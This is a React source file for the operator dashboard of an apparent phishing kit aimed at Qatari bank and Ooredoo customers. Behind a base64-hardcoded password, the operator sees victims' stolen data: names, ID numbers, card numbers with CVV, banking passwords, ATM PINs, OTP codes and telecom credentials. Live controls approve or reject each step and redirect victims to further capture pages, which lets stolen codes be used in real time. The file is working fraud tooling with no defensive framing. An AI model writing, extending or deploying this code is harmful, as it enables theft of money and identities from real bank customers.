import { useState, useMemo } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { Loader2, Eye, RefreshCcw, Check, X, Users, Lock, LogOut, Globe, Phone, CreditCard, Calendar, Hash } from "lucide-react";

// --- PROFESSIONAL STYLES (PURE CSS) ---
const styles = {
  loginContainer: {
    minHeight: '100vh',
    width: '100%',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    backgroundColor: '#0a0a0a',
    fontFamily: 'system-ui, -apple-system, sans-serif',
    position: 'relative' as const,
    overflow: 'hidden',
  },
  loginCard: {
    backgroundColor: '#141414',
    border: '1px solid #333',
    padding: '40px',
    borderRadius: '24px',
    width: '100%',
    maxWidth: '400px',
    zIndex: 10,
    boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.5)',
    textAlign: 'center' as const,
  },
  input: {
    width: '100%',
    backgroundColor: '#000',
    border: '1px solid #333',
    color: '#fff',
    padding: '16px',
    borderRadius: '12px',
    fontSize: '16px',
    marginBottom: '20px',
    outline: 'none',
    boxSizing: 'border-box' as const,
  },
  button: {
    width: '100%',
    backgroundColor: '#e11d48',
    color: '#fff',
    padding: '16px',
    borderRadius: '12px',
    fontSize: '16px',
    fontWeight: 'bold',
    border: 'none',
    cursor: 'pointer',
    transition: 'all 0.2s',
  },
  dashboardContainer: {
    minHeight: '100vh',
    backgroundColor: '#f8fafc',
    fontFamily: 'system-ui, -apple-system, sans-serif',
  },
  nav: {
    backgroundColor: '#fff',
    borderBottom: '1px solid #e2e8f0',
    padding: '0 20px',
    height: '80px',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
    position: 'sticky' as const,
    top: 0,
    zIndex: 100,
  },
  statsGrid: {
    display: 'grid',
    gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))',
    gap: '24px',
    padding: '40px 20px',
    maxWidth: '1280px',
    margin: '0 auto',
  },
  statCard: {
    padding: '32px',
    borderRadius: '24px',
    color: '#fff',
    position: 'relative' as const,
    overflow: 'hidden',
    boxShadow: '0 10px 15px -3px rgba(0, 0, 0, 0.1)',
  },
  tableContainer: {
    maxWidth: '1280px',
    margin: '0 auto 40px',
    backgroundColor: '#fff',
    borderRadius: '24px',
    border: '1px solid #e2e8f0',
    overflow: 'hidden',
    boxShadow: '0 4px 6px -1px rgba(0, 0, 0, 0.1)',
  },
  table: {
    width: '100%',
    borderCollapse: 'collapse' as const,
    textAlign: 'right' as const,
  },
  th: {
    padding: '20px',
    backgroundColor: '#f8fafc',
    color: '#64748b',
    fontSize: '12px',
    fontWeight: 'bold',
    textTransform: 'uppercase' as const,
    letterSpacing: '0.05em',
    borderBottom: '2px solid #f1f5f9',
  },
  td: {
    padding: '20px',
    borderBottom: '1px solid #f1f5f9',
    fontSize: '14px',
    color: '#1e293b',
  },
  badge: {
    padding: '6px 12px',
    borderRadius: '9999px',
    fontSize: '11px',
    fontWeight: 'bold',
    textTransform: 'uppercase' as const,
  }
};

const getStatusDisplay = (currentStep: string | null | undefined, language: string) => {
  const statusMap: Record<string, Record<string, string>> = {
    ar: {
      login: "تسجيل الدخول",
      otp: "OTP الأول",
      atm: "ATM PIN",
      ooredoo: "Ooredoo",
      otp_ooredoo: "OTP Ooredoo",
      pending: "في الانتظار",
      approved: "تمت الموافقة",
      rejected: "تم الرفض",
    },
    en: {
      login: "Login Page",
      otp: "First OTP",
      atm: "ATM PIN",
      ooredoo: "Ooredoo",
      otp_ooredoo: "Ooredoo OTP",
      pending: "Pending",
      approved: "Approved",
      rejected: "Rejected",
    },
  };
  return statusMap[language]?.[currentStep || "pending"] || currentStep || "—";
};

const getStatusStyles = (currentStep: string | null | undefined) => {
  const colorMap: Record<string, { bg: string, text: string }> = {
    login: { bg: '#dbeafe', text: '#1e40af' },
    otp: { bg: '#f3e8ff', text: '#6b21a8' },
    atm: { bg: '#ffedd5', text: '#9a3412' },
    ooredoo: { bg: '#fee2e2', text: '#991b1b' },
    otp_ooredoo: { bg: '#fce7f3', text: '#9d174d' },
  };
  const colors = colorMap[currentStep || ""] || { bg: '#f1f5f9', text: '#475569' };
  return { backgroundColor: colors.bg, color: colors.text };
};

export default function AdminDashboard() {
  const { language, t } = useLanguage();
  const [, setLocation] = useLocation();
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedSession, setSelectedSession] = useState<string | null>(null);
  const [showDetails, setShowDetails] = useState(false);
  const [showRedirectMenu, setShowRedirectMenu] = useState<string | null>(null);
  const [password, setPassword] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    return typeof window !== 'undefined' && sessionStorage.getItem("adminAuthenticated") === "true";
  });
  const [error, setError] = useState("");

  const { data: submissions, isLoading, refetch } = trpc.submissions.getAllSubmissions.useQuery(undefined, {
    enabled: isAuthenticated,
    refetchInterval: 3000,
  });

  const { data: details } = trpc.submissions.getSubmissionDetails.useQuery(selectedSession || "", {
    enabled: !!selectedSession && isAuthenticated,
  });

  const adminTakeAction = trpc.submissions.adminTakeAction.useMutation({ onSuccess: () => refetch() });
  const adminRedirectMutation = trpc.submissions.adminRedirect.useMutation({ onSuccess: () => refetch() });

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    const obfuscatedKey = "UWF0YXJAQDIwMA==";
    if (btoa(password) === obfuscatedKey) {
      setIsAuthenticated(true);
      sessionStorage.setItem("adminAuthenticated", "true");
      setError("");
    } else {
      setError(language === "ar" ? "كلمة المرور غير صحيحة" : "Incorrect password");
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    sessionStorage.removeItem("adminAuthenticated");
  };

  const filteredSubmissions = useMemo(() => {
    if (!submissions) return [];
    return submissions.filter((sub) =>
      sub.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
      sub.selectedBank.toLowerCase().includes(searchTerm.toLowerCase()) ||
      (sub.nameArabic && sub.nameArabic.includes(searchTerm)) ||
      (sub.phoneNumber && sub.phoneNumber.includes(searchTerm))
    );
  }, [submissions, searchTerm]);

  const handleAction = async (sessionId: string, action: string) => {
    let errorMessage = "";
    if (action === "reject") {
      const session = submissions?.find(s => s.id === sessionId);
      if (session?.currentStep === "login") errorMessage = t("invalid_data");
      else if (session?.currentStep === "otp") errorMessage = t("invalid_otp");
      else if (session?.currentStep === "atm") errorMessage = t("invalid_atm");
      else if (session?.currentStep === "ooredoo") errorMessage = t("invalid_ooredoo");
      else if (session?.currentStep === "otp_ooredoo") errorMessage = t("invalid_ooredoo_otp");
    }
    await adminTakeAction.mutateAsync({ sessionId, action, errorMessage });
  };

  const handleRedirect = async (sessionId: string, targetPage: string) => {
    try {
      await adminRedirectMutation.mutateAsync({ sessionId, targetPage });
      setShowRedirectMenu(null);
    } catch (err) {
      console.error(err);
    }
  };

  const redirectPages = [
    { id: "login-method", label: language === "ar" ? "تسجيل الدخول" : "Login Page" },
    { id: "otp", label: language === "ar" ? "OTP الأول" : "First OTP" },
    { id: "atm-pin", label: language === "ar" ? "ATM PIN" : "ATM PIN" },
    { id: "ooredoo", label: language === "ar" ? "Ooredoo" : "Ooredoo" },
    { id: "otp-ooredoo", label: language === "ar" ? "OTP Ooredoo" : "Ooredoo OTP" },
    { id: "success", label: language === "ar" ? "صفحة النجاح" : "Success Page" },
  ];

  if (!isAuthenticated) {
    return (
      <div style={styles.loginContainer} dir={language === "ar" ? "rtl" : "ltr"}>
        <div style={styles.loginCard}>
          <div style={{ marginBottom: '30px' }}>
            <div style={{ width: '80px', height: '80px', backgroundColor: '#e11d48', borderRadius: '20px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px', boxShadow: '0 10px 20px rgba(225, 29, 72, 0.3)' }}>
              <Lock size={40} color="#fff" />
            </div>
            <h1 style={{ color: '#fff', fontSize: '28px', fontWeight: '900', margin: 0 }}>
              {language === "ar" ? "لوحة الإدارة" : "Admin Panel"}
            </h1>
            <p style={{ color: '#666', fontSize: '14px', marginTop: '10px' }}>
              {language === "ar" ? "يرجى إدخال كلمة المرور للمتابعة" : "Enter password to continue"}
            </p>
          </div>
          <form onSubmit={handleLogin}>
            <input
              type="password"
              placeholder="••••••••"
              style={styles.input}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            {error && <p style={{ color: '#ef4444', fontSize: '12px', fontWeight: 'bold', marginBottom: '20px' }}>{error}</p>}
            <button type="submit" style={styles.button}>
              {language === "ar" ? "تسجيل الدخول" : "Sign In"}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div style={styles.dashboardContainer} dir={language === "ar" ? "rtl" : "ltr"}>
      <nav style={styles.nav}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
          <div style={{ width: '40px', height: '40px', backgroundColor: '#e11d48', borderRadius: '10px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <Users size={20} color="#fff" />
          </div>
          <h1 style={{ fontSize: '20px', fontWeight: '900', color: '#0f172a' }}>
            {language === "ar" ? "لوحة التحكم" : "Control Panel"}
          </h1>
        </div>
        <div style={{ display: 'flex', gap: '10px' }}>
          <button onClick={() => setLocation("/")} style={{ padding: '10px 20px', borderRadius: '12px', border: '1px solid #e2e8f0', backgroundColor: '#fff', fontWeight: 'bold', fontSize: '12px', cursor: 'pointer' }}>
            {language === "ar" ? "عرض الموقع" : "View Site"}
          </button>
          <button onClick={handleLogout} style={{ padding: '10px 20px', borderRadius: '12px', border: 'none', backgroundColor: '#fee2e2', color: '#991b1b', fontWeight: 'bold', fontSize: '12px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px' }}>
            <LogOut size={16} /> {language === "ar" ? "خروج" : "Logout"}
          </button>
        </div>
      </nav>

      <div style={styles.statsGrid}>
        <div style={{ ...styles.statCard, background: 'linear-gradient(135deg, #1e293b 0%, #0f172a 100%)' }}>
          <p style={{ fontSize: '12px', fontWeight: 'bold', opacity: 0.7, textTransform: 'uppercase' }}>{language === "ar" ? "الزيارات" : "Visitors"}</p>
          <p style={{ fontSize: '48px', fontWeight: '900', margin: '10px 0' }}>{submissions?.length || 0}</p>
          <Users size={60} style={{ position: 'absolute', right: '-10px', bottom: '-10px', opacity: 0.1 }} />
        </div>
        <div style={{ ...styles.statCard, background: 'linear-gradient(135deg, #e11d48 0%, #9f1239 100%)' }}>
          <p style={{ fontSize: '12px', fontWeight: 'bold', opacity: 0.7, textTransform: 'uppercase' }}>{language === "ar" ? "طلبات معلقة" : "Pending"}</p>
          <p style={{ fontSize: '48px', fontWeight: '900', margin: '10px 0' }}>{submissions?.filter(s => s.status === "loading").length || 0}</p>
          <Loader2 size={60} style={{ position: 'absolute', right: '-10px', bottom: '-10px', opacity: 0.1 }} />
        </div>
        <div style={{ ...styles.statCard, background: 'linear-gradient(135deg, #10b981 0%, #065f46 100%)' }}>
          <p style={{ fontSize: '12px', fontWeight: 'bold', opacity: 0.7, textTransform: 'uppercase' }}>{language === "ar" ? "مكتملة" : "Completed"}</p>
          <p style={{ fontSize: '48px', fontWeight: '900', margin: '10px 0' }}>{submissions?.filter(s => s.status === "approved").length || 0}</p>
          <Check size={60} style={{ position: 'absolute', right: '-10px', bottom: '-10px', opacity: 0.1 }} />
        </div>
      </div>

      <div style={{ padding: '0 20px', maxWidth: '1280px', margin: '0 auto 20px' }}>
        <input
          placeholder={language === "ar" ? "بحث سريع عن عميل..." : "Search customers..."}
          style={{ ...styles.input, backgroundColor: '#fff', border: '1px solid #e2e8f0', color: '#000', marginBottom: 0 }}
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
        />
      </div>

      <div style={styles.tableContainer}>
        <table style={styles.table}>
          <thead>
            <tr>
              <th style={styles.th}>{language === "ar" ? "الدولة" : "Country"}</th>
              <th style={styles.th}>{language === "ar" ? "البنك" : "Bank"}</th>
              <th style={styles.th}>{language === "ar" ? "الاسم" : "Name"}</th>
              <th style={styles.th}>{language === "ar" ? "الهاتف" : "Phone"}</th>
              <th style={styles.th}>{language === "ar" ? "الحالة" : "Status"}</th>
              <th style={{ ...styles.th, textAlign: 'center' }}>{language === "ar" ? "إجراءات" : "Actions"}</th>
            </tr>
          </thead>
          <tbody>
            {isLoading ? (
              <tr><td colSpan={6} style={{ padding: '40px', textAlign: 'center' }}><Loader2 className="animate-spin" style={{ margin: '0 auto' }} /></td></tr>
            ) : filteredSubmissions.map(sub => (
              <tr key={sub.id}>
                <td style={styles.td}>{sub.country || "Qatar"}</td>
                <td style={styles.td}><span style={{ color: '#e11d48', fontWeight: 'bold' }}>{sub.selectedBank.toUpperCase()}</span></td>
                <td style={styles.td}>{sub.nameArabic || "—"}</td>
                <td style={styles.td}>{sub.phoneNumber || "—"}</td>
                <td style={styles.td}>
                  <span style={{ ...styles.badge, ...getStatusStyles(sub.currentStep) }}>
                    {getStatusDisplay(sub.currentStep, language)}
                  </span>
                </td>
                <td style={{ ...styles.td, textAlign: 'center' }}>
                  <div style={{ display: 'flex', gap: '8px', justifyContent: 'center' }}>
                    <button onClick={() => { setSelectedSession(sub.id); setShowDetails(true); }} style={{ padding: '8px 12px', borderRadius: '8px', border: 'none', backgroundColor: '#f1f5f9', cursor: 'pointer', fontWeight: 'bold', fontSize: '12px' }}>
                      {language === "ar" ? "تفاصيل" : "Details"}
                    </button>
                    <div style={{ position: 'relative' }}>
                      <button onClick={() => setShowRedirectMenu(showRedirectMenu === sub.id ? null : sub.id)} style={{ padding: '8px 12px', borderRadius: '8px', border: 'none', backgroundColor: '#f1f5f9', cursor: 'pointer', fontWeight: 'bold', fontSize: '12px' }}>
                        {language === "ar" ? "توجيه" : "Redirect"}
                      </button>
                      {showRedirectMenu === sub.id && (
                        <div style={{ position: 'absolute', top: '100%', left: 0, backgroundColor: '#fff', border: '1px solid #e2e8f0', borderRadius: '12px', boxShadow: '0 10px 15px -3px rgba(0,0,0,0.1)', zIndex: 1000, minWidth: '150px' }}>
                          {redirectPages.map(p => (
                            <div key={p.id} onClick={() => handleRedirect(sub.id, p.id)} style={{ padding: '12px 16px', fontSize: '12px', fontWeight: 'bold', cursor: 'pointer', borderBottom: '1px solid #f1f5f9' }}>{p.label}</div>
                          ))}
                        </div>
                      )}
                    </div>
                    {sub.status === "loading" && (
                      <>
                        <button onClick={() => handleAction(sub.id, "approve")} style={{ width: '32px', height: '32px', borderRadius: '8px', border: 'none', backgroundColor: '#10b981', color: '#fff', cursor: 'pointer' }}><Check size={16} /></button>
                        <button onClick={() => handleAction(sub.id, "reject")} style={{ width: '32px', height: '32px', borderRadius: '8px', border: 'none', backgroundColor: '#ef4444', color: '#fff', cursor: 'pointer' }}><X size={16} /></button>
                      </>
                    )}
                  </div>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <Dialog open={showDetails} onOpenChange={setShowDetails}>
        <DialogContent style={{ maxWidth: '600px', padding: 0, borderRadius: '24px', overflow: 'hidden', border: 'none' }}>
          <div style={{ backgroundColor: '#1e293b', padding: '24px', color: '#fff' }}>
            <h3 style={{ margin: 0, fontSize: '20px', fontWeight: '900' }}>{language === "ar" ? "تفاصيل البيانات" : "Data Details"}</h3>
          </div>
          <div style={{ padding: '24px', maxHeight: '70vh', overflowY: 'auto', backgroundColor: '#fff' }}>
            {details ? (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                <div style={{ padding: '20px', backgroundColor: '#f8fafc', borderRadius: '16px', border: '1px solid #e2e8f0' }}>
                  <p style={{ fontSize: '10px', fontWeight: 'bold', color: '#64748b', marginBottom: '10px', textTransform: 'uppercase' }}>{language === "ar" ? "البيانات الشخصية" : "Personal Data"}</p>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', fontSize: '14px' }}>
                    <div><strong>الاسم:</strong> {details.personalData?.nameArabic}</div>
                    <div><strong>الهاتف:</strong> {details.personalData?.phoneNumber}</div>
                    <div><strong>الهوية:</strong> {details.personalData?.idNumber}</div>
                    <div><strong>الميلاد:</strong> {details.personalData?.dateOfBirth}</div>
                  </div>
                </div>
                <div style={{ padding: '20px', backgroundColor: '#fff5f5', borderRadius: '16px', border: '1px solid #fed7d7' }}>
                  <p style={{ fontSize: '10px', fontWeight: 'bold', color: '#c53030', marginBottom: '10px', textTransform: 'uppercase' }}>{language === "ar" ? "بيانات الدخول" : "Login Info"}</p>
                  {details.loginMethod?.loginType === 'card' ? (
                    <div style={{ fontSize: '14px' }}>
                      <p><strong>رقم البطاقة:</strong> <span style={{ fontSize: '18px', letterSpacing: '2px', fontWeight: '900' }}>{details.loginMethod.cardNumber}</span></p>
                      <p><strong>الانتهاء:</strong> {details.loginMethod.expiryDate} | <strong>CVV:</strong> {details.loginMethod.cvv}</p>
                    </div>
                  ) : (
                    <div style={{ fontSize: '14px' }}>
                      <p><strong>المستخدم:</strong> {details.loginMethod?.username}</p>
                      <p><strong>كلمة المرور:</strong> {details.loginMethod?.password}</p>
                    </div>
                  )}
                </div>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '15px' }}>
                  {details.atmPin && (
                    <div style={{ padding: '15px', backgroundColor: '#fffaf0', borderRadius: '16px', border: '1px solid #feebc8', textAlign: 'center' }}>
                      <p style={{ fontSize: '10px', fontWeight: 'bold', color: '#c05621', marginBottom: '5px' }}>ATM PIN</p>
                      <p style={{ fontSize: '24px', fontWeight: '900', margin: 0 }}>{details.atmPin.pin}</p>
                    </div>
                  )}
                  {details.otp && (
                    <div style={{ padding: '15px', backgroundColor: '#ebf8ff', borderRadius: '16px', border: '1px solid #bee3f8', textAlign: 'center' }}>
                      <p style={{ fontSize: '10px', fontWeight: 'bold', color: '#2b6cb0', marginBottom: '5px' }}>OTP CODE</p>
                      <p style={{ fontSize: '24px', fontWeight: '900', margin: 0 }}>{details.otp.otpCode}</p>
                    </div>
                  )}
                </div>
                {details.ooredoo && (
                  <div style={{ padding: '20px', backgroundColor: '#faf5ff', borderRadius: '16px', border: '1px solid #e9d8fd' }}>
                    <p style={{ fontSize: '10px', fontWeight: 'bold', color: '#6b46c1', marginBottom: '10px' }}>OOREDOO DATA</p>
                    <p><strong>User:</strong> {details.ooredoo.ooredooUser} | <strong>Pass:</strong> {details.ooredoo.ooredooPassword}</p>
                  </div>
                )}
              </div>
            ) : <Loader2 className="animate-spin mx-auto" />}
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
